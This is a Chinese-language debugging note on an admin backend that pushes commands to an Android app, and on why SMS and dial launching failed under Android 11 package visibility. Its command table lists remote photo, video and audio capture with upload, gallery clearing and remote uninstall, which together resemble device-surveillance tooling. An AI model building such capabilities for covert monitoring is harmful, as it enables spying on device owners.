# 后台指令下发与「短信此前可用、未改代码却失效」说明

## 1. 后台下发功能检查结论

所有下发指令走同一套链路，**后端与前端调用一致**，逻辑正常：

| 指令 | 后台入口 (devices.html) | 参数 | API | App 执行 (command_executor.dart) | 依赖 |
|------|-------------------------|------|-----|----------------------------------|------|
| mop.cmd.dial | 拨号设置 → 拨号按钮 | `{ number }` | POST .../command | openSystemDialer(number) | Android 需 `<queries>` DIAL/tel（已加） |
| mop.cmd.sms | 发送短信到 → 发送按钮 | `{ number, body }` | 同上 | openSystemSms(number, body) | Android 需 `<queries>` SENDTO/smsto（已加） |
| mop.cmd.gallery.clear | 远程设备管理 → 清理相册 | `{ days: 3 }` | 同上 | clearGalleryWithinDays(days) | 原生实现 |
| mop.cmd.uninstall | 远程设备管理 → 远程卸载 | `{}` | 同上 | uninstallApp() | 原生实现 |
| mop.cmd.capture.photo | 远程采集 → 拍照 | `{}` 或 camera | 同上 | capturePhoto + auditUpload | 相机权限 |
| mop.cmd.capture.video | 远程采集 → 录像 | `{ duration_sec: 18 }` | 同上 | captureVideo + auditUpload | 相机+麦克风权限 |
| mop.cmd.capture.audio | 远程采集 → 录音 | `{ duration_sec: 18 }` | 同上 | captureAudio + auditUpload | 麦克风权限 |

- **后台**：`sendCommandToDevice(deviceId, cmd, params, ...)` → `adminApi.sendCommand(deviceId, cmd, params)` → POST body `{ cmd, params }`。
- **服务端**：`AdminSendCommand` 解析 `cmd`、`params`，`SaveCommand` 将 params 以 JSON 存入；`GetCommands` 拉取时按 `msg_id/cmd/params` 返回，拉取即消费。
- **App**：轮询 `GET /api/v1/device/commands?device_id=xxx`，对每条 `execute(cmd)`，按 `cmd['cmd']` 分支，从 `cmd['params']` 取参并调 NativeBridge。

因此：**其他下发功能（拨号、清理相册、卸载、远程采集等）在协议与参数传递上均正常**；若某设备上某项不生效，多为该设备上的权限、原生实现或系统限制（见下节短信/拨号）导致。

---

## 2. 为何「之前可以下发短信触发，未改代码却不能用了」

原因来自 **Android 11（API 30）的包可见性（Package Visibility）**，与您是否改业务代码无关。

- **机制**：从 Android 11 起，应用若 **targetSdk ≥ 30**，系统默认不再向您的应用暴露「哪些应用能处理某类 Intent」。未在 Manifest 里用 `<queries>` 声明的 Intent（例如 `ACTION_SENDTO` + `smsto:`），系统会认为您的应用「不需要知道」，从而：
  - `resolveActivity(intent)` 可能返回 null；
  - `startActivity(intent)` 可能找不到处理者，或静默不拉起界面。
- **表现**：同一份 App 代码在 **Android 10** 上可以正常唤起系统短信界面；在 **Android 11+** 上或当 **App 的 targetSdk 升级到 30+** 后，就会突然无法唤起短信（拨号同理），看起来像「没改代码却不能用了」。
- **常见触发方式**：
  1. 测试设备系统从 Android 10 升级到 Android 11+；
  2. Flutter/构建环境升级，`targetSdk` 随 `flutter.targetSdkVersion` 升到 30+；
  3. 同一设备上之前装的是 targetSdk&lt;30 的旧包，后来装了 targetSdk≥30 的新包。

**修复方式（已做）**：

- 在 `AndroidManifest.xml` 的 `<queries>` 中声明需要解析的 Intent：
  - `ACTION_SENDTO` + `data android:scheme="smsto"`（短信）；
  - `ACTION_DIAL` + `data android:scheme="tel"`（拨号）。
- 在 `MainActivity` 中对 `openSystemSms` / `openSystemDialer`：使用 `runOnUiThread` 启动、Intent 加 `FLAG_ACTIVITY_NEW_TASK`、先 `resolveActivity` 再 `startActivity`，并捕获 `ActivityNotFoundException` 做错误回调。

这样在 **未改后台与业务逻辑** 的前提下，仅通过 Manifest 与启动方式的合规修改，即可在 Android 11+ 上重新稳定唤起短信/拨号。

---

## 3. 小结

- **后台其他下发功能**：协议与参数一致，拨号/清理相册/卸载/远程采集等均走同一套下发与执行流程，**无发现异常**。
- **短信（及拨号）此前可用、未改代码却失效**：由 **Android 11+ 包可见性** 导致；已通过 **Manifest `<queries>` + 主线程/NEW_TASK/resolveActivity 与异常处理** 修复，无需改后台或 Flutter 业务代码。
